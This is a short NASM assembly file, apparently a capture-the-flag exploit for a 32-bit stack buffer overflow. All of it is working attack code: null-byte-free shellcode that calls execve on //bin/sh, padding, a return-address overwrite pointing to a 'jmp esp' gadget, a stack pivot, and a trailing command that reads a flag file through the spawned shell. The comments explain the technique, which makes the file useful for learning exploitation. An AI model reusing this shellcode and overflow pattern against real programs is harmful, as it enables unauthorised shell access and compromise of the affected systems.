bits 32
org 0

; Requirements for execve:
;   EAX = 0xB : syscall code
;   EBX = shellcode_dest : address of string
;   ECX = Command line arguments
;   EDX = Environment variables

; We can't write null bytes to finish the path string in the shellcode,
; but it is possible to push nulls onto the stack

shellcode_part2:
    cdq                 ; EDX = 0x0000, sets all bits in EDX to EAX's sign bit, which we set to 0.
    push edx            ; push 0x0000, ESP will now be pointing 4 bytes before shellcode_part2
    mov ecx, esp        ; ECX = pointer to 0x0000
    push 0x68732f6e     ; push "n/sh"
    push 0x69622f2f     ; push "//bi"
    ; The string ends with the zeros we pushed earlier
    mov ebx, esp        ; EBX = pointer to "//bin/sh", 0
    int 0x80            ; syscall - execve

    times 18 - ($-$$) db "A"    ; Fill first 18 bytes with something

    dd 0x0804919F       ; Overwrite return address from vuln with address of 'jmp esp' instruction

shellcode_start:        ; esp points here when jumped to
    mov esp, eax        ; ESP = shellcode_part2, as it is vuln's dest address returned by strcpy
    push 0xb            ; EAX = 0xB - code for execve syscall, can't mov eax, 0xb because the machine code will contain null byte
    pop eax
    jmp esp

enter_shellcode: db 0x0A, 0x0D
shell_command: db 'cat /home/ctf/flag.txt', 0x0A, 0x0D